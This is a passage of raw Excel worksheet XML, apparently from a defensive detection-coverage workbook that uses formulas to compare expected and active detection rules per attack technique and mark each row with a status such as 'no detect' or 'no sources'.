        <f t="array" ref="H489">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I489" s="9" t="str" cm="1">
        <f t="array" ref="I489">IF(SUM(IF($C489=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C489=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J489" s="9" t="str" cm="1">
        <f t="array" ref="J48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89" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M489" s="9" cm="1">
        <f t="array" ref="M489">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N489" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O489" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P489" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S48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89" t="s">
        <v>1287</v>
      </c>
      <c r="U489" t="s">
        <v>2350</v>
      </c>
      <c r="W489" t="b">
        <v>1</v>
      </c>
      <c r="X489" t="s">
        <v>2334</v>
      </c>
    </row>
    <row r="490" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A490" t="s">
        <v>2351</v>
      </c>
      <c r="B490" t="s">
        <v>2351</v>
      </c>
      <c r="C490" t="s">
        <v>100</v>
      </c>
      <c r="D490" t="s">
        <v>12</v>
      </c>
      <c r="E490" t="s">
        <v>2352</v>
      </c>
      <c r="F490" s="9">
        <f t="shared" si="7"/>
        <v>6</v>
      </c>
      <c r="G490" s="9" cm="1">
        <f t="array" ref="G490">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H490" s="9" cm="1">
        <f t="array" ref="H490">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I490" s="9" t="str" cm="1">
        <f t="array" ref="I490">IF(SUM(IF($C490=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C490=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J490" s="9" cm="1">
        <f t="array" ref="J49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490" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M490" s="9" cm="1">
        <f t="array" ref="M490">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N490" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O490" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P490" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S49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90" t="s">
        <v>999</v>
      </c>
      <c r="U490" t="s">
        <v>2353</v>
      </c>
      <c r="V490" t="s">
        <v>2354</v>
      </c>
      <c r="W490" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="491" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A491" t="s">
        <v>2351</v>
      </c>
      <c r="B491" t="s">
        <v>2355</v>
      </c>
      <c r="C491" t="s">
        <v>2356</v>
      </c>
      <c r="D491" t="s">
        <v>12</v>
      </c>
      <c r="E491" t="s">
        <v>2357</v>
      </c>
      <c r="F491" s="9">
        <f t="shared" si="7"/>
        <v>4</v>
      </c>
      <c r="G491" s="9" cm="1">
        <f t="array" ref="G491">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H491" s="9" t="str" cm="1">
        <f t="array" ref="H491">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I491" s="9" t="str" cm="1">
        <f t="array" ref="I491">IF(SUM(IF($C491=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C491=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J491" s="9" t="str" cm="1">
        <f t="array" ref="J49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91" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M491" s="9" cm="1">
        <f t="array" ref="M491">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N491" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O491" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P491" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S49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91" t="s">
        <v>368</v>
      </c>
      <c r="U491" t="s">
        <v>2358</v>
      </c>
      <c r="V491" t="s">
        <v>2359</v>
      </c>
      <c r="W491" t="b">
        <v>1</v>
      </c>
      <c r="X491" t="s">
        <v>2351</v>
      </c>
    </row>
    <row r="492" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A492" t="s">
        <v>2351</v>
      </c>
      <c r="B492" t="s">
        <v>2360</v>
      </c>
      <c r="C492" t="s">
        <v>302</v>
      </c>
      <c r="D492" t="s">
        <v>12</v>
      </c>
      <c r="E492" t="s">
        <v>444</v>
      </c>
      <c r="F492" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G492" s="9" cm="1">
        <f t="array" ref="G492">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H492" s="9" t="str" cm="1">
        <f t="array" ref="H492">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I492" s="9" t="str" cm="1">
        <f t="array" ref="I492">IF(SUM(IF($C492=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C492=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J492" s="9" t="str" cm="1">
        <f t="array" ref="J49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92" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M492" s="9" cm="1">
        <f t="array" ref="M492">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N492" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O492" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P492" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S49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92" t="s">
        <v>368</v>
      </c>
      <c r="U492" t="s">
        <v>2361</v>
      </c>
      <c r="V492" t="s">
        <v>2362</v>
      </c>
      <c r="W492" t="b">
        <v>1</v>
      </c>
      <c r="X492" t="s">
        <v>2351</v>
      </c>
    </row>
    <row r="493" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A493" t="s">
        <v>2351</v>
      </c>
      <c r="B493" t="s">
        <v>2363</v>
      </c>
      <c r="C493" t="s">
        <v>2364</v>
      </c>
      <c r="D493" t="s">
        <v>12</v>
      </c>
      <c r="E493" t="s">
        <v>940</v>
      </c>
      <c r="F493" s="9">
        <f t="shared" si="7"/>
        <v>2</v>
      </c>
      <c r="G493" s="9" cm="1">
        <f t="array" ref="G493">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H493" s="9" t="str" cm="1">
        <f t="array" ref="H493">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I493" s="9" t="str" cm="1">
        <f t="array" ref="I493">IF(SUM(IF($C493=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C493=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J493" s="9" t="str" cm="1">
        <f t="array" ref="J49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93" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M493" s="9" cm="1">
        <f t="array" ref="M493">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N493" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O493" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P493" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S49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93" t="s">
        <v>368</v>
      </c>
      <c r="U493" t="s">
        <v>2365</v>
      </c>
      <c r="W493" t="b">
        <v>1</v>
      </c>
      <c r="X493" t="s">
        <v>2351</v>
      </c>
    </row>
    <row r="494" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A494" t="s">
        <v>2351</v>
      </c>
      <c r="B494" t="s">
        <v>2366</v>
      </c>
      <c r="C494" t="s">
        <v>2367</v>
      </c>
      <c r="D494" t="s">
        <v>12</v>
      </c>
      <c r="E494" t="s">
        <v>2368</v>
      </c>
      <c r="F494" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G494" s="9" cm="1">
        <f t="array" ref="G494">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H494" s="9" t="str" cm="1">
        <f t="array" ref="H494">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I494" s="9" t="str" cm="1">
        <f t="array" ref="I494">IF(SUM(IF($C494=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C494=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J494" s="9" t="str" cm="1">
        <f t="array" ref="J49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94" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M494" s="9" cm="1">
        <f t="array" ref="M494">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N494" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O494" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P494" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S49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94" t="s">
        <v>999</v>
      </c>
      <c r="U494" t="s">
        <v>2369</v>
      </c>
      <c r="W494" t="b">
        <v>1</v>
      </c>
      <c r="X494" t="s">
        <v>2351</v>
      </c>
    </row>
    <row r="495" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A495" t="s">
        <v>2370</v>
      </c>
      <c r="B495" t="s">
        <v>2370</v>
      </c>
      <c r="C495" t="s">
        <v>87</v>
      </c>
      <c r="D495" t="s">
        <v>11</v>
      </c>
      <c r="E495" t="s">
        <v>1029</v>
      </c>
      <c r="F495" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G495" s="9" cm="1">
        <f t="array" ref="G495">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H495" s="9" cm="1">
        <f t="array" ref="H495">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I495" s="9" t="str" cm="1">
        <f t="array" ref="I495">IF(SUM(IF($C495=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C495=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J495" s="9" cm="1">
        <f t="array" ref="J49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495" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M495" s="9" cm="1">
        <f t="array" ref="M495">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N495" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O495" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P495" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S49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95" t="s">
        <v>368</v>
      </c>
      <c r="U495" t="s">
        <v>2371</v>
      </c>
      <c r="V495" t="s">
        <v>2372</v>
      </c>
      <c r="W495" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="496" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A496" t="s">
        <v>2370</v>
      </c>
      <c r="B496" t="s">
        <v>2373</v>
      </c>
      <c r="C496" t="s">
        <v>2374</v>
      </c>
      <c r="D496" t="s">
        <v>11</v>
      </c>
      <c r="E496" t="s">
        <v>438</v>
      </c>
      <c r="F496" s="9">
        <f t="shared" si="7"/>
        <v>2</v>
      </c>
      <c r="G496" s="9" cm="1">
        <f t="array" ref="G496">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H496" s="9" t="str" cm="1">
        <f t="array" ref="H496">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I496" s="9" t="str" cm="1">
        <f t="array" ref="I496">IF(SUM(IF($C496=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C496=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J496" s="9" t="str" cm="1">
        <f t="array" ref="J49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96" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M496" s="9" cm="1">
        <f t="array" ref="M496">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N496" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O496" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P496" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S49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96" t="s">
        <v>368</v>
      </c>
      <c r="U496" t="s">
        <v>2375</v>
      </c>
      <c r="V496" t="s">
        <v>2376</v>
      </c>
      <c r="W496" t="b">
        <v>1</v>
      </c>
      <c r="X496" t="s">
        <v>2370</v>
      </c>
    </row>
    <row r="497" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A497" t="s">
        <v>2370</v>
      </c>
      <c r="B497" t="s">
        <v>2377</v>
      </c>
      <c r="C497" t="s">
        <v>2378</v>
      </c>
      <c r="D497" t="s">
        <v>11</v>
      </c>
      <c r="E497" t="s">
        <v>2379</v>
      </c>
      <c r="F497" s="9">
        <f t="shared" si="7"/>
        <v>1</v>
      </c>
      <c r="G497" s="9" cm="1">
        <f t="array" ref="G497">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H497" s="9" t="str" cm="1">
        <f t="array" ref="H497">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I497" s="9" t="str" cm="1">
        <f t="array" ref="I497">IF(SUM(IF($C497=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C497=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J497" s="9" t="str" cm="1">
        <f t="array" ref="J49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97" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M497" s="9" cm="1">
        <f t="array" ref="M497">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N497" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O497" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P497" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S49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97" t="s">
        <v>368</v>
      </c>
      <c r="U497" t="s">
        <v>2380</v>
      </c>
      <c r="V497" t="s">
        <v>2381</v>
      </c>
      <c r="W497" t="b">
        <v>1</v>
      </c>
      <c r="X497" t="s">
        <v>2370</v>
      </c>
    </row>
    <row r="498" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A498" t="s">
        <v>2370</v>
      </c>
      <c r="B498" t="s">
        <v>2382</v>
      </c>
      <c r="C498" t="s">
        <v>2383</v>
      </c>
      <c r="D498" t="s">
        <v>11</v>
      </c>
      <c r="E498" t="s">
        <v>367</v>
      </c>
      <c r="F498" s="9">
        <f t="shared" si="7"/>
        <v>1</v>
      </c>
      <c r="G498" s="9" cm="1">
        <f t="array" ref="G498">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H498" s="9" t="str" cm="1">
        <f t="array" ref="H498">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I498" s="9" t="str" cm="1">
        <f t="array" ref="I498">IF(SUM(IF($C498=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C498=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J498" s="9" t="str" cm="1">
        <f t="array" ref="J49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498" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M498" s="9" cm="1">
        <f t="array" ref="M498">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N498" s="9">
